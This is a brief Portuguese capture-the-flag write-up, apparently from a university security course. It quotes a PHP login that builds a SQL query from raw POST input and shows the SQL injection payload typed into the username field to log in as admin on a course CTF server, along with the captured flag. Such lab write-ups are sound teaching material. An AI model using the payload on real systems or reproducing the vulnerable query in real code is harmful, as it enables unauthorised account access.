## Desafio 1
Analisando o código `index.php` reparamos que existe um *querie* na linha 40
```php
               $username = $_POST['username'];
               $password = $_POST['password'];
               
               $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
```
então deparamo-nos que é possível fazer um slq injection, abrimos o site `http://ctf-sp.dcc.fc.up.pt:5003/index.php`
e fizemos o seguinte ataque:

Username:  `admin'; SELECT * FROM user WHERE username='admin'`

Password:  `" "` -> Basicamente qualquer coisa server neste sitio

O que nos deu acesso á pagina admin
```
You have been logged in as admin
flag{2bdec59fe0a019c1a7aad16f68f4a89f} 
```
